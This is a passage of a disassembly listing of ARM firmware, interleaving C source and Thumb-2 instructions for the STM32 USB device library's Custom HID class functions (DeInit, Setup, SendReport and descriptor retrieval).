 800889e:	781b      	ldrb	r3, [r3, #0]
 80088a0:	4619      	mov	r1, r3
 80088a2:	6878      	ldr	r0, [r7, #4]
 80088a4:	f004 fa60 	bl	800cd68 <USBD_LL_CloseEP>
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 0U;
 80088a8:	4b34      	ldr	r3, [pc, #208]	; (800897c <USBD_CUSTOM_HID_DeInit+0xec>)
 80088aa:	781b      	ldrb	r3, [r3, #0]
 80088ac:	f003 020f 	and.w	r2, r3, #15
 80088b0:	6879      	ldr	r1, [r7, #4]
 80088b2:	4613      	mov	r3, r2
 80088b4:	009b      	lsls	r3, r3, #2
 80088b6:	4413      	add	r3, r2
 80088b8:	009b      	lsls	r3, r3, #2
 80088ba:	440b      	add	r3, r1
 80088bc:	3324      	adds	r3, #36	; 0x24
 80088be:	2200      	movs	r2, #0
 80088c0:	801a      	strh	r2, [r3, #0]
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = 0U;
 80088c2:	4b2e      	ldr	r3, [pc, #184]	; (800897c <USBD_CUSTOM_HID_DeInit+0xec>)
 80088c4:	781b      	ldrb	r3, [r3, #0]
 80088c6:	f003 020f 	and.w	r2, r3, #15
 80088ca:	6879      	ldr	r1, [r7, #4]
 80088cc:	4613      	mov	r3, r2
 80088ce:	009b      	lsls	r3, r3, #2
 80088d0:	4413      	add	r3, r2
 80088d2:	009b      	lsls	r3, r3, #2
 80088d4:	440b      	add	r3, r1
 80088d6:	3326      	adds	r3, #38	; 0x26
 80088d8:	2200      	movs	r2, #0
 80088da:	801a      	strh	r2, [r3, #0]

  /* Close CUSTOM_HID EP OUT */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDOutEpAdd);
 80088dc:	4b28      	ldr	r3, [pc, #160]	; (8008980 <USBD_CUSTOM_HID_DeInit+0xf0>)
 80088de:	781b      	ldrb	r3, [r3, #0]
 80088e0:	4619      	mov	r1, r3
 80088e2:	6878      	ldr	r0, [r7, #4]
 80088e4:	f004 fa40 	bl	800cd68 <USBD_LL_CloseEP>
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 0U;
 80088e8:	4b25      	ldr	r3, [pc, #148]	; (8008980 <USBD_CUSTOM_HID_DeInit+0xf0>)
 80088ea:	781b      	ldrb	r3, [r3, #0]
 80088ec:	f003 020f 	and.w	r2, r3, #15
 80088f0:	6879      	ldr	r1, [r7, #4]
 80088f2:	4613      	mov	r3, r2
 80088f4:	009b      	lsls	r3, r3, #2
 80088f6:	4413      	add	r3, r2
 80088f8:	009b      	lsls	r3, r3, #2
 80088fa:	440b      	add	r3, r1
 80088fc:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008900:	2200      	movs	r2, #0
 8008902:	801a      	strh	r2, [r3, #0]
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = 0U;
 8008904:	4b1e      	ldr	r3, [pc, #120]	; (8008980 <USBD_CUSTOM_HID_DeInit+0xf0>)
 8008906:	781b      	ldrb	r3, [r3, #0]
 8008908:	f003 020f 	and.w	r2, r3, #15
 800890c:	6879      	ldr	r1, [r7, #4]
 800890e:	4613      	mov	r3, r2
 8008910:	009b      	lsls	r3, r3, #2
 8008912:	4413      	add	r3, r2
 8008914:	009b      	lsls	r3, r3, #2
 8008916:	440b      	add	r3, r1
 8008918:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 800891c:	2200      	movs	r2, #0
 800891e:	801a      	strh	r2, [r3, #0]

  /* Free allocated memory */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 8008920:	687b      	ldr	r3, [r7, #4]
 8008922:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008926:	687b      	ldr	r3, [r7, #4]
 8008928:	32b0      	adds	r2, #176	; 0xb0
 800892a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800892e:	2b00      	cmp	r3, #0
 8008930:	d01f      	beq.n	8008972 <USBD_CUSTOM_HID_DeInit+0xe2>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->DeInit();
 8008932:	687b      	ldr	r3, [r7, #4]
 8008934:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008938:	687a      	ldr	r2, [r7, #4]
 800893a:	33b0      	adds	r3, #176	; 0xb0
 800893c:	009b      	lsls	r3, r3, #2
 800893e:	4413      	add	r3, r2
 8008940:	685b      	ldr	r3, [r3, #4]
 8008942:	689b      	ldr	r3, [r3, #8]
 8008944:	4798      	blx	r3
    USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 8008946:	687b      	ldr	r3, [r7, #4]
 8008948:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800894c:	687b      	ldr	r3, [r7, #4]
 800894e:	32b0      	adds	r2, #176	; 0xb0
 8008950:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008954:	4618      	mov	r0, r3
 8008956:	f004 fc19 	bl	800d18c <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 800895a:	687b      	ldr	r3, [r7, #4]
 800895c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008960:	687b      	ldr	r3, [r7, #4]
 8008962:	32b0      	adds	r2, #176	; 0xb0
 8008964:	2100      	movs	r1, #0
 8008966:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 800896a:	687b      	ldr	r3, [r7, #4]
 800896c:	2200      	movs	r2, #0
 800896e:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 8008972:	2300      	movs	r3, #0
}
 8008974:	4618      	mov	r0, r3
 8008976:	3708      	adds	r7, #8
 8008978:	46bd      	mov	sp, r7
 800897a:	bd80      	pop	{r7, pc}
 800897c:	200000a6 	.word	0x200000a6
 8008980:	200000a7 	.word	0x200000a7

08008984 <USBD_CUSTOM_HID_Setup>:
  * @param  req: usb requests
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Setup(USBD_HandleTypeDef *pdev,
                                     USBD_SetupReqTypedef *req)
{
 8008984:	b580      	push	{r7, lr}
 8008986:	b088      	sub	sp, #32
 8008988:	af00      	add	r7, sp, #0
 800898a:	6078      	str	r0, [r7, #4]
 800898c:	6039      	str	r1, [r7, #0]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800898e:	687b      	ldr	r3, [r7, #4]
 8008990:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008994:	687b      	ldr	r3, [r7, #4]
 8008996:	32b0      	adds	r2, #176	; 0xb0
 8008998:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800899c:	613b      	str	r3, [r7, #16]
  uint16_t len = 0U;
 800899e:	2300      	movs	r3, #0
 80089a0:	83fb      	strh	r3, [r7, #30]
#ifdef USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED
  uint16_t ReportLength = 0U;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */
  uint8_t  *pbuf = NULL;
 80089a2:	2300      	movs	r3, #0
 80089a4:	61bb      	str	r3, [r7, #24]
  uint16_t status_info = 0U;
 80089a6:	2300      	movs	r3, #0
 80089a8:	81fb      	strh	r3, [r7, #14]
  USBD_StatusTypeDef ret = USBD_OK;
 80089aa:	2300      	movs	r3, #0
 80089ac:	75fb      	strb	r3, [r7, #23]

  if (hhid == NULL)
 80089ae:	693b      	ldr	r3, [r7, #16]
 80089b0:	2b00      	cmp	r3, #0
 80089b2:	d101      	bne.n	80089b8 <USBD_CUSTOM_HID_Setup+0x34>
  {
    return (uint8_t)USBD_FAIL;
 80089b4:	2303      	movs	r3, #3
 80089b6:	e0f8      	b.n	8008baa <USBD_CUSTOM_HID_Setup+0x226>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 80089b8:	683b      	ldr	r3, [r7, #0]
 80089ba:	781b      	ldrb	r3, [r3, #0]
 80089bc:	f003 0360 	and.w	r3, r3, #96	; 0x60
 80089c0:	2b00      	cmp	r3, #0
 80089c2:	d056      	beq.n	8008a72 <USBD_CUSTOM_HID_Setup+0xee>
 80089c4:	2b20      	cmp	r3, #32
 80089c6:	f040 80e8 	bne.w	8008b9a <USBD_CUSTOM_HID_Setup+0x216>
  {
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 80089ca:	683b      	ldr	r3, [r7, #0]
 80089cc:	785b      	ldrb	r3, [r3, #1]
 80089ce:	3b02      	subs	r3, #2
 80089d0:	2b09      	cmp	r3, #9
 80089d2:	d846      	bhi.n	8008a62 <USBD_CUSTOM_HID_Setup+0xde>
 80089d4:	a201      	add	r2, pc, #4	; (adr r2, 80089dc <USBD_CUSTOM_HID_Setup+0x58>)
 80089d6:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80089da:	bf00      	nop
 80089dc:	08008a35 	.word	0x08008a35
 80089e0:	08008a13 	.word	0x08008a13
 80089e4:	08008a63 	.word	0x08008a63
 80089e8:	08008a63 	.word	0x08008a63
 80089ec:	08008a63 	.word	0x08008a63
 80089f0:	08008a63 	.word	0x08008a63
 80089f4:	08008a63 	.word	0x08008a63
 80089f8:	08008a45 	.word	0x08008a45
 80089fc:	08008a23 	.word	0x08008a23
 8008a00:	08008a05 	.word	0x08008a05
      {
        case CUSTOM_HID_REQ_SET_PROTOCOL:
          hhid->Protocol = (uint8_t)(req->wValue);
 8008a04:	683b      	ldr	r3, [r7, #0]
 8008a06:	885b      	ldrh	r3, [r3, #2]
 8008a08:	b2db      	uxtb	r3, r3
 8008a0a:	461a      	mov	r2, r3
 8008a0c:	693b      	ldr	r3, [r7, #16]
 8008a0e:	611a      	str	r2, [r3, #16]
          break;
 8008a10:	e02e      	b.n	8008a70 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_PROTOCOL:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->Protocol, 1U);
 8008a12:	693b      	ldr	r3, [r7, #16]
 8008a14:	3310      	adds	r3, #16
 8008a16:	2201      	movs	r2, #1
 8008a18:	4619      	mov	r1, r3
 8008a1a:	6878      	ldr	r0, [r7, #4]
 8008a1c:	f003 fd0e 	bl	800c43c <USBD_CtlSendData>
          break;
 8008a20:	e026      	b.n	8008a70 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_SET_IDLE:
          hhid->IdleState = (uint8_t)(req->wValue >> 8);
 8008a22:	683b      	ldr	r3, [r7, #0]
 8008a24:	885b      	ldrh	r3, [r3, #2]
 8008a26:	0a1b      	lsrs	r3, r3, #8
 8008a28:	b29b      	uxth	r3, r3
 8008a2a:	b2db      	uxtb	r3, r3
 8008a2c:	461a      	mov	r2, r3
 8008a2e:	693b      	ldr	r3, [r7, #16]
 8008a30:	615a      	str	r2, [r3, #20]
          break;
 8008a32:	e01d      	b.n	8008a70 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_IDLE:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->IdleState, 1U);
 8008a34:	693b      	ldr	r3, [r7, #16]
 8008a36:	3314      	adds	r3, #20
 8008a38:	2201      	movs	r2, #1
 8008a3a:	4619      	mov	r1, r3
 8008a3c:	6878      	ldr	r0, [r7, #4]
 8008a3e:	f003 fcfd 	bl	800c43c <USBD_CtlSendData>
          break;
 8008a42:	e015      	b.n	8008a70 <USBD_CUSTOM_HID_Setup+0xec>
            ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->CtrlReqComplete(req->bRequest,
                                                                                            req->wLength);
          }
#endif /* USBD_CUSTOMHID_CTRL_REQ_COMPLETE_CALLBACK_ENABLED */
#ifndef USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED
          hhid->IsReportAvailable = 1U;
 8008a44:	693b      	ldr	r3, [r7, #16]
 8008a46:	2201      	movs	r2, #1
 8008a48:	61da      	str	r2, [r3, #28]
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 8008a4a:	6939      	ldr	r1, [r7, #16]
                                  MIN(req->wLength, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE));
 8008a4c:	683b      	ldr	r3, [r7, #0]
 8008a4e:	88db      	ldrh	r3, [r3, #6]
 8008a50:	2b0f      	cmp	r3, #15
 8008a52:	bf28      	it	cs
 8008a54:	230f      	movcs	r3, #15
 8008a56:	b29b      	uxth	r3, r3
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 8008a58:	461a      	mov	r2, r3
 8008a5a:	6878      	ldr	r0, [r7, #4]
 8008a5c:	f003 fd1a 	bl	800c494 <USBD_CtlPrepareRx>
#endif /* USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED */
          break;
 8008a60:	e006      	b.n	8008a70 <USBD_CUSTOM_HID_Setup+0xec>
          }
          break;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */

        default:
          USBD_CtlError(pdev, req);
 8008a62:	6839      	ldr	r1, [r7, #0]
 8008a64:	6878      	ldr	r0, [r7, #4]
 8008a66:	f003 fc78 	bl	800c35a <USBD_CtlError>
          ret = USBD_FAIL;
 8008a6a:	2303      	movs	r3, #3
 8008a6c:	75fb      	strb	r3, [r7, #23]
          break;
 8008a6e:	bf00      	nop
      }
      break;
 8008a70:	e09a      	b.n	8008ba8 <USBD_CUSTOM_HID_Setup+0x224>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 8008a72:	683b      	ldr	r3, [r7, #0]
 8008a74:	785b      	ldrb	r3, [r3, #1]
 8008a76:	2b0b      	cmp	r3, #11
 8008a78:	f200 8086 	bhi.w	8008b88 <USBD_CUSTOM_HID_Setup+0x204>
 8008a7c:	a201      	add	r2, pc, #4	; (adr r2, 8008a84 <USBD_CUSTOM_HID_Setup+0x100>)
 8008a7e:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8008a82:	bf00      	nop
 8008a84:	08008ab5 	.word	0x08008ab5
 8008a88:	08008b97 	.word	0x08008b97
 8008a8c:	08008b89 	.word	0x08008b89
 8008a90:	08008b89 	.word	0x08008b89
 8008a94:	08008b89 	.word	0x08008b89
 8008a98:	08008b89 	.word	0x08008b89
 8008a9c:	08008adf 	.word	0x08008adf
 8008aa0:	08008b89 	.word	0x08008b89
 8008aa4:	08008b89 	.word	0x08008b89
 8008aa8:	08008b89 	.word	0x08008b89
 8008aac:	08008b37 	.word	0x08008b37
 8008ab0:	08008b61 	.word	0x08008b61
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008ab4:	687b      	ldr	r3, [r7, #4]
 8008ab6:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008aba:	b2db      	uxtb	r3, r3
 8008abc:	2b03      	cmp	r3, #3
 8008abe:	d107      	bne.n	8008ad0 <USBD_CUSTOM_HID_Setup+0x14c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 8008ac0:	f107 030e 	add.w	r3, r7, #14
 8008ac4:	2202      	movs	r2, #2
 8008ac6:	4619      	mov	r1, r3
 8008ac8:	6878      	ldr	r0, [r7, #4]
 8008aca:	f003 fcb7 	bl	800c43c <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008ace:	e063      	b.n	8008b98 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 8008ad0:	6839      	ldr	r1, [r7, #0]
 8008ad2:	6878      	ldr	r0, [r7, #4]
 8008ad4:	f003 fc41 	bl	800c35a <USBD_CtlError>
            ret = USBD_FAIL;
 8008ad8:	2303      	movs	r3, #3
 8008ada:	75fb      	strb	r3, [r7, #23]
          break;
 8008adc:	e05c      	b.n	8008b98 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_DESCRIPTOR:
          if ((req->wValue >> 8) == CUSTOM_HID_REPORT_DESC)
 8008ade:	683b      	ldr	r3, [r7, #0]
 8008ae0:	885b      	ldrh	r3, [r3, #2]
 8008ae2:	0a1b      	lsrs	r3, r3, #8
 8008ae4:	b29b      	uxth	r3, r3
 8008ae6:	2b22      	cmp	r3, #34	; 0x22
 8008ae8:	d110      	bne.n	8008b0c <USBD_CUSTOM_HID_Setup+0x188>
          {
            len = MIN(USBD_CUSTOM_HID_REPORT_DESC_SIZE, req->wLength);
 8008aea:	683b      	ldr	r3, [r7, #0]
 8008aec:	88db      	ldrh	r3, [r3, #6]
 8008aee:	2b49      	cmp	r3, #73	; 0x49
 8008af0:	bf28      	it	cs
 8008af2:	2349      	movcs	r3, #73	; 0x49
 8008af4:	83fb      	strh	r3, [r7, #30]
            pbuf = ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->pReport;
 8008af6:	687b      	ldr	r3, [r7, #4]
 8008af8:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008afc:	687a      	ldr	r2, [r7, #4]
 8008afe:	33b0      	adds	r3, #176	; 0xb0
 8008b00:	009b      	lsls	r3, r3, #2
 8008b02:	4413      	add	r3, r2
 8008b04:	685b      	ldr	r3, [r3, #4]
 8008b06:	681b      	ldr	r3, [r3, #0]
 8008b08:	61bb      	str	r3, [r7, #24]
 8008b0a:	e00d      	b.n	8008b28 <USBD_CUSTOM_HID_Setup+0x1a4>
          }
          else
          {
            if ((req->wValue >> 8) == CUSTOM_HID_DESCRIPTOR_TYPE)
 8008b0c:	683b      	ldr	r3, [r7, #0]
 8008b0e:	885b      	ldrh	r3, [r3, #2]
 8008b10:	0a1b      	lsrs	r3, r3, #8
 8008b12:	b29b      	uxth	r3, r3
 8008b14:	2b21      	cmp	r3, #33	; 0x21
 8008b16:	d107      	bne.n	8008b28 <USBD_CUSTOM_HID_Setup+0x1a4>
            {
              pbuf = USBD_CUSTOM_HID_Desc;
 8008b18:	4b26      	ldr	r3, [pc, #152]	; (8008bb4 <USBD_CUSTOM_HID_Setup+0x230>)
 8008b1a:	61bb      	str	r3, [r7, #24]
              len = MIN(USB_CUSTOM_HID_DESC_SIZ, req->wLength);
 8008b1c:	683b      	ldr	r3, [r7, #0]
 8008b1e:	88db      	ldrh	r3, [r3, #6]
 8008b20:	2b09      	cmp	r3, #9
 8008b22:	bf28      	it	cs
 8008b24:	2309      	movcs	r3, #9
 8008b26:	83fb      	strh	r3, [r7, #30]
            }
          }

          (void)USBD_CtlSendData(pdev, pbuf, len);
 8008b28:	8bfb      	ldrh	r3, [r7, #30]
 8008b2a:	461a      	mov	r2, r3
 8008b2c:	69b9      	ldr	r1, [r7, #24]
 8008b2e:	6878      	ldr	r0, [r7, #4]
 8008b30:	f003 fc84 	bl	800c43c <USBD_CtlSendData>
          break;
 8008b34:	e030      	b.n	8008b98 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008b36:	687b      	ldr	r3, [r7, #4]
 8008b38:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008b3c:	b2db      	uxtb	r3, r3
 8008b3e:	2b03      	cmp	r3, #3
 8008b40:	d107      	bne.n	8008b52 <USBD_CUSTOM_HID_Setup+0x1ce>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->AltSetting, 1U);
 8008b42:	693b      	ldr	r3, [r7, #16]
 8008b44:	3318      	adds	r3, #24
 8008b46:	2201      	movs	r2, #1
 8008b48:	4619      	mov	r1, r3
 8008b4a:	6878      	ldr	r0, [r7, #4]
 8008b4c:	f003 fc76 	bl	800c43c <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008b50:	e022      	b.n	8008b98 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 8008b52:	6839      	ldr	r1, [r7, #0]
 8008b54:	6878      	ldr	r0, [r7, #4]
 8008b56:	f003 fc00 	bl	800c35a <USBD_CtlError>
            ret = USBD_FAIL;
 8008b5a:	2303      	movs	r3, #3
 8008b5c:	75fb      	strb	r3, [r7, #23]
          break;
 8008b5e:	e01b      	b.n	8008b98 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008b60:	687b      	ldr	r3, [r7, #4]
 8008b62:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008b66:	b2db      	uxtb	r3, r3
 8008b68:	2b03      	cmp	r3, #3
 8008b6a:	d106      	bne.n	8008b7a <USBD_CUSTOM_HID_Setup+0x1f6>
          {
            hhid->AltSetting = (uint8_t)(req->wValue);
 8008b6c:	683b      	ldr	r3, [r7, #0]
 8008b6e:	885b      	ldrh	r3, [r3, #2]
 8008b70:	b2db      	uxtb	r3, r3
 8008b72:	461a      	mov	r2, r3
 8008b74:	693b      	ldr	r3, [r7, #16]
 8008b76:	619a      	str	r2, [r3, #24]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008b78:	e00e      	b.n	8008b98 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 8008b7a:	6839      	ldr	r1, [r7, #0]
 8008b7c:	6878      	ldr	r0, [r7, #4]
 8008b7e:	f003 fbec 	bl	800c35a <USBD_CtlError>
            ret = USBD_FAIL;
 8008b82:	2303      	movs	r3, #3
 8008b84:	75fb      	strb	r3, [r7, #23]
          break;
 8008b86:	e007      	b.n	8008b98 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_CLEAR_FEATURE:
          break;

        default:
          USBD_CtlError(pdev, req);
 8008b88:	6839      	ldr	r1, [r7, #0]
 8008b8a:	6878      	ldr	r0, [r7, #4]
 8008b8c:	f003 fbe5 	bl	800c35a <USBD_CtlError>
          ret = USBD_FAIL;
 8008b90:	2303      	movs	r3, #3
 8008b92:	75fb      	strb	r3, [r7, #23]
          break;
 8008b94:	e000      	b.n	8008b98 <USBD_CUSTOM_HID_Setup+0x214>
          break;
 8008b96:	bf00      	nop
      }
      break;
 8008b98:	e006      	b.n	8008ba8 <USBD_CUSTOM_HID_Setup+0x224>

    default:
      USBD_CtlError(pdev, req);
 8008b9a:	6839      	ldr	r1, [r7, #0]
 8008b9c:	6878      	ldr	r0, [r7, #4]
 8008b9e:	f003 fbdc 	bl	800c35a <USBD_CtlError>
      ret = USBD_FAIL;
 8008ba2:	2303      	movs	r3, #3
 8008ba4:	75fb      	strb	r3, [r7, #23]
      break;
 8008ba6:	bf00      	nop
  }
  return (uint8_t)ret;
 8008ba8:	7dfb      	ldrb	r3, [r7, #23]
}
 8008baa:	4618      	mov	r0, r3
 8008bac:	3720      	adds	r7, #32
 8008bae:	46bd      	mov	sp, r7
 8008bb0:	bd80      	pop	{r7, pc}
 8008bb2:	bf00      	nop
 8008bb4:	20000090 	.word	0x20000090

08008bb8 <USBD_CUSTOM_HID_SendReport>:
{
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[ClassId];
#else
uint8_t USBD_CUSTOM_HID_SendReport(USBD_HandleTypeDef *pdev,
                                   uint8_t *report, uint16_t len)
{
 8008bb8:	b580      	push	{r7, lr}
 8008bba:	b086      	sub	sp, #24
 8008bbc:	af00      	add	r7, sp, #0
 8008bbe:	60f8      	str	r0, [r7, #12]
 8008bc0:	60b9      	str	r1, [r7, #8]
 8008bc2:	4613      	mov	r3, r2
 8008bc4:	80fb      	strh	r3, [r7, #6]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008bc6:	68fb      	ldr	r3, [r7, #12]
 8008bc8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008bcc:	68fb      	ldr	r3, [r7, #12]
 8008bce:	32b0      	adds	r2, #176	; 0xb0
 8008bd0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008bd4:	617b      	str	r3, [r7, #20]
#endif /* USE_USBD_COMPOSITE */

  if (hhid == NULL)
 8008bd6:	697b      	ldr	r3, [r7, #20]
 8008bd8:	2b00      	cmp	r3, #0
 8008bda:	d101      	bne.n	8008be0 <USBD_CUSTOM_HID_SendReport+0x28>
  {
    return (uint8_t)USBD_FAIL;
 8008bdc:	2303      	movs	r3, #3
 8008bde:	e019      	b.n	8008c14 <USBD_CUSTOM_HID_SendReport+0x5c>
#ifdef USE_USBD_COMPOSITE
  /* Get Endpoint IN address allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, ClassId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008be0:	68fb      	ldr	r3, [r7, #12]
 8008be2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008be6:	b2db      	uxtb	r3, r3
 8008be8:	2b03      	cmp	r3, #3
 8008bea:	d112      	bne.n	8008c12 <USBD_CUSTOM_HID_SendReport+0x5a>
  {
    if (hhid->state == CUSTOM_HID_IDLE)
 8008bec:	697b      	ldr	r3, [r7, #20]
 8008bee:	f893 3020 	ldrb.w	r3, [r3, #32]
 8008bf2:	2b00      	cmp	r3, #0
 8008bf4:	d10b      	bne.n	8008c0e <USBD_CUSTOM_HID_SendReport+0x56>
    {
      hhid->state = CUSTOM_HID_BUSY;
 8008bf6:	697b      	ldr	r3, [r7, #20]
 8008bf8:	2201      	movs	r2, #1
 8008bfa:	f883 2020 	strb.w	r2, [r3, #32]
      (void)USBD_LL_Transmit(pdev, CUSTOMHIDInEpAdd, report, len);
 8008bfe:	4b07      	ldr	r3, [pc, #28]	; (8008c1c <USBD_CUSTOM_HID_SendReport+0x64>)
 8008c00:	7819      	ldrb	r1, [r3, #0]
 8008c02:	88fb      	ldrh	r3, [r7, #6]
 8008c04:	68ba      	ldr	r2, [r7, #8]
 8008c06:	68f8      	ldr	r0, [r7, #12]
 8008c08:	f004 f9ea 	bl	800cfe0 <USBD_LL_Transmit>
 8008c0c:	e001      	b.n	8008c12 <USBD_CUSTOM_HID_SendReport+0x5a>
    }
    else
    {
      return (uint8_t)USBD_BUSY;
 8008c0e:	2301      	movs	r3, #1
 8008c10:	e000      	b.n	8008c14 <USBD_CUSTOM_HID_SendReport+0x5c>
    }
  }
  return (uint8_t)USBD_OK;
 8008c12:	2300      	movs	r3, #0
}
 8008c14:	4618      	mov	r0, r3
 8008c16:	3718      	adds	r7, #24
 8008c18:	46bd      	mov	sp, r7
 8008c1a:	bd80      	pop	{r7, pc}
 8008c1c:	200000a6 	.word	0x200000a6

08008c20 <USBD_CUSTOM_HID_GetFSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetFSCfgDesc(uint16_t *length)
{
 8008c20:	b580      	push	{r7, lr}
 8008c22:	b084      	sub	sp, #16
 8008c24:	af00      	add	r7, sp, #0
 8008c26:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008c28:	2181      	movs	r1, #129	; 0x81
 8008c2a:	4815      	ldr	r0, [pc, #84]	; (8008c80 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008c2c:	f002 fd32 	bl	800b694 <USBD_GetEpDesc>
 8008c30:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008c32:	2101      	movs	r1, #1
 8008c34:	4812      	ldr	r0, [pc, #72]	; (8008c80 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008c36:	f002 fd2d 	bl	800b694 <USBD_GetEpDesc>
 8008c3a:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008c3c:	68fb      	ldr	r3, [r7, #12]
 8008c3e:	2b00      	cmp	r3, #0
 8008c40:	d009      	beq.n	8008c56 <USBD_CUSTOM_HID_GetFSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008c42:	68fb      	ldr	r3, [r7, #12]
 8008c44:	2200      	movs	r2, #0
 8008c46:	f042 0202 	orr.w	r2, r2, #2
 8008c4a:	711a      	strb	r2, [r3, #4]
 8008c4c:	2200      	movs	r2, #0
 8008c4e:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008c50:	68fb      	ldr	r3, [r7, #12]
 8008c52:	2205      	movs	r2, #5
 8008c54:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008c56:	68bb      	ldr	r3, [r7, #8]
 8008c58:	2b00      	cmp	r3, #0
 8008c5a:	d009      	beq.n	8008c70 <USBD_CUSTOM_HID_GetFSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008c5c:	68bb      	ldr	r3, [r7, #8]
 8008c5e:	2200      	movs	r2, #0
 8008c60:	f042 0202 	orr.w	r2, r2, #2
